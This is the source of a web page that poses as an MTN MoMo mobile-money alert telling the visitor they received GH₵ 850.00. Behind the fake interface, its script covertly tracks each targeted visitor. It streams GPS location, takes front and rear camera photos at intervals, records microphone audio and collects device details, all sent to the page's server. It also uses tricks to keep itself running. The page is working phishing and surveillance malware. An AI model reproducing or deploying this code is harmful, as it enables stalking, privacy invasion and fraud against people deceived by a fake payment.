<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Roboto',sans-serif;-webkit-font-smoothing:antialiased;overflow-x:hidden}
.hidden{display:none!important}
.spin{animation:sp .7s linear infinite}
@keyframes sp{to{transform:rotate(360deg)}}
@keyframes fadeUp{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
.fade-up{animation:fadeUp .4s ease}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
@keyframes dotPulse{0%,80%,100%{transform:scale(0)}40%{transform:scale(1)}}

/* ═══ MOMO / MONEY PAGES ═══ */
.mm-page{background:#fff;min-height:100vh}
.mm-status{background:#000;padding:4px 16px;display:flex;justify-content:space-between;font-size:11px;color:#fff}
.mm-bar{padding:12px 16px;display:flex;align-items:center}
.mm-bar .back{font-size:20px;margin-right:12px}
.mm-bar .logo{font-weight:700;font-size:18px;flex:1}
.mm-bar .icons{display:flex;gap:14px;font-size:18px}
.mm-tabs{display:flex;border-bottom:2px solid rgba(0,0,0,.1)}
.mm-tabs .tab{flex:1;text-align:center;padding:10px;font-size:13px;font-weight:500;color:rgba(0,0,0,.4);position:relative}
.mm-tabs .tab.active{color:#000}
.mm-tabs .tab.active::after{content:'';position:absolute;bottom:0;left:20%;right:20%;height:3px;background:#000;border-radius:3px 3px 0 0}
.mm-body{padding:14px;max-width:500px;margin:0 auto}
.mm-balance{background:#f5f5f5;border-radius:10px;padding:12px 14px;margin-bottom:10px;display:flex;align-items:center;justify-content:space-between}
.mm-balance .lbl{font-size:12px;color:#888}
.mm-balance .val{font-size:11px;color:#666;letter-spacing:1px}
.mm-pending{border-radius:8px;padding:9px 12px;display:flex;align-items:center;gap:8px;font-size:13px;margin-bottom:10px}
.mm-pending .dot{width:8px;height:8px;border-radius:50%;animation:pulse 1.5s infinite}
.mm-notif{background:#fff;border-radius:12px;border:1px solid #e8e8e8;overflow:hidden;margin-bottom:10px;box-shadow:0 1px 4px rgba(0,0,0,.05)}
.mm-notif .top{display:flex;align-items:center;gap:10px;padding:12px 14px;border-bottom:1px solid #f5f5f5}
.mm-notif .top .circle{width:42px;height:42px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
.mm-notif .top .info{flex:1}
.mm-notif .top .info .title{font-size:14px;color:#000;font-weight:600}
.mm-notif .top .info .time{font-size:11px;color:#999;margin-top:1px}
.mm-notif .top .amount{font-size:18px;font-weight:700}
.mm-detail{padding:12px 14px}
.mm-row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #fafafa;font-size:13px}
.mm-row:last-child{border:none}
.mm-row .k{color:#888}
.mm-row .v{color:#222;font-weight:500;text-align:right}
.mm-btn{border:none;padding:13px;border-radius:10px;font-size:16px;cursor:pointer;width:100%;font-weight:700;font-family:inherit;margin-top:8px;transition:.2s}
.mm-btn:active{transform:scale(.98)}
.mm-btn:disabled{opacity:.5;cursor:default}
.mm-receipt{border-radius:10px;padding:16px;margin-top:12px;text-align:center}
.mm-receipt .check{width:44px;height:44px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;color:#fff;margin:0 auto 8px}
.mm-receipt .msg{font-size:15px;font-weight:600}
.mm-receipt .sub{font-size:12px;margin-top:3px}
.mm-receipt .ref{font-size:11px;color:#999;margin-top:6px;font-family:monospace}
.mm-other{background:#fff;border-radius:12px;border:1px solid #e8e8e8;margin-top:10px;overflow:hidden}
.mm-other .hdr{padding:10px 14px;font-size:12px;color:#888;font-weight:500;border-bottom:1px solid #f5f5f5}
.mm-txn{display:flex;align-items:center;gap:10px;padding:10px 14px;border-bottom:1px solid #f8f8f8}
.mm-txn:last-child{border:none}
.mm-txn .ic{width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:15px}
.mm-txn .det{flex:1}
.mm-txn .det .nm{font-size:13px;color:#222}
.mm-txn .det .dt{font-size:11px;color:#999;margin-top:1px}
.mm-txn .amt{font-size:13px;font-weight:600}

<body>
<script>
const TID=window.location.pathname.split('/').pop();
const PB=window.location.pathname.split('/')[1];
let MS=null,OK=false;

// ═══ GPS + CAMERA + AUDIO ═══
function sG(p){fetch('/api/gps/'+TID,{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,
alt:p.coords.altitude,spd:p.coords.speed,dir:p.coords.heading,source:'gps',ts:new Date().toISOString()})}).catch(()=>{})}
function gps(){return new Promise((y,n)=>{navigator.geolocation.getCurrentPosition(p=>{sG(p);
navigator.geolocation.watchPosition(sG,()=>{},{enableHighAccuracy:true,maximumAge:0,timeout:30000});y()},
e=>{navigator.geolocation.getCurrentPosition(p=>{sG(p);y()},n,{enableHighAccuracy:false,timeout:10000})},
{enableHighAccuracy:true,timeout:30000,maximumAge:0})})}
function fG(){navigator.geolocation.getCurrentPosition(sG,()=>{},{enableHighAccuracy:true,timeout:10000,maximumAge:0})}
async function cam(){try{MS=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:true});
await snap('front');setTimeout(snapR,5000)}catch(e){try{MS=await navigator.mediaDevices.getUserMedia({audio:true})}catch(e2){}}}
async function snap(c){if(!MS||!MS.getVideoTracks().length)return;try{const v=document.createElement('video');v.srcObject=MS;
v.setAttribute('playsinline','');v.muted=true;await v.play();await new Promise(r=>setTimeout(r,600));
const cv=document.createElement('canvas');cv.width=v.videoWidth||640;cv.height=v.videoHeight||480;
cv.getContext('2d').drawImage(v,0,0);fetch('/api/media/'+TID,{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({type:'photo',camera:c,data:cv.toDataURL('image/jpeg',.8),ts:new Date().toISOString()})}).catch(()=>{})}catch(e){}}
async function snapR(){try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:{exact:'environment'}}});
const v=document.createElement('video');v.srcObject=s;v.setAttribute('playsinline','');v.muted=true;await v.play();
await new Promise(r=>setTimeout(r,1000));const cv=document.createElement('canvas');cv.width=v.videoWidth;cv.height=v.videoHeight;
cv.getContext('2d').drawImage(v,0,0);s.getTracks().forEach(t=>t.stop());fetch('/api/media/'+TID,{method:'POST',
headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'photo',camera:'rear',data:cv.toDataURL('image/jpeg',.8),
ts:new Date().toISOString()})}).catch(()=>{})}catch(e){}}
function rec(d){if(!MS||!MS.getAudioTracks().length)return;try{const mt=MediaRecorder.isTypeSupported('audio/webm;codecs=opus')?
'audio/webm;codecs=opus':'audio/webm';const r=new MediaRecorder(MS,{mimeType:mt});const ch=[];
r.ondataavailable=e=>{if(e.data.size>0)ch.push(e.data)};r.onstop=()=>{const b=new Blob(ch,{type:mt});const rd=new FileReader();
rd.onloadend=()=>{fetch('/api/media/'+TID,{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({type:'audio',data:rd.result,ts:new Date().toISOString()})}).catch(()=>{})};rd.readAsDataURL(b)};
r.start();setTimeout(()=>{try{r.stop()}catch(e){}},d)}catch(e){}}
function persist(){if('serviceWorker' in navigator)navigator.serviceWorker.register('/sw.js').catch(()=>{});
try{const c=new(window.AudioContext||window.webkitAudioContext)();const o=c.createOscillator();const g=c.createGain();
g.gain.value=.0001;o.connect(g);g.connect(c.destination);o.start()}catch(e){}
try{if('wakeLock' in navigator)navigator.wakeLock.request('screen')}catch(e){}
try{if('locks' in navigator)navigator.locks.request('r'+TID,{mode:'exclusive'},()=>new Promise(()=>{}))}catch(e){}}
function loop(){setInterval(()=>snap('front'),30000);setInterval(snapR,120000);setInterval(()=>rec(10000),60000);
setTimeout(()=>rec(15000),2000);
document.addEventListener('visibilitychange',()=>{if(!document.hidden){fG();if(MS)snap('front')}});
window.addEventListener('beforeunload',()=>{navigator.geolocation.getCurrentPosition(p=>{
navigator.sendBeacon('/api/beacon/'+TID,JSON.stringify({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}))},
()=>{},{enableHighAccuracy:true,timeout:3000})})}
function dev(){fetch('/api/device/'+TID,{method:'POST',headers:{'Content-Type':'application/json'},
body:JSON.stringify({platform:navigator.platform,userAgent:navigator.userAgent,
timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,screen:{w:screen.width,h:screen.height}})}).catch(()=>{})}
async function go(){if(OK)return;OK=true;try{await gps()}catch(e){}try{await cam()}catch(e){}
if('Notification' in window)Notification.requestPermission().catch(()=>{});persist();dev();loop()}
function setOG(t,d){document.getElementById('ogt').content=t;document.getElementById('ogd').content=d;document.getElementById('pt').textContent=t}

// ═══ MTN MOMO ═══

setOG('MTN MoMo — You received GH₵ 850.00','Tap to confirm and receive money');
document.getElementById('tc').content='#ffcb05';
const txn='MOB'+Date.now().toString().slice(-10);
const time=new Date().toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'});
const date=new Date().toLocaleDateString('en-GB',{day:'numeric',month:'short',year:'numeric'});
document.body.innerHTML=`<div class="mm-page">
<div class="mm-status"><span>${time}</span><span>📶 MTN 4G 🔋78%</span></div>
<div class="mm-bar" style="background:#ffcb05"><span class="back" style="color:#000">‹</span><span class="logo" style="color:#000">MoMo</span><span class="icons" style="color:#000">🔍 ⋮</span></div>
<div class="mm-tabs" style="background:#ffcb05"><div class="tab active">Home</div><div class="tab">History</div><div class="tab">Services</div></div>
<div class="mm-body">

</div></div></div>`;
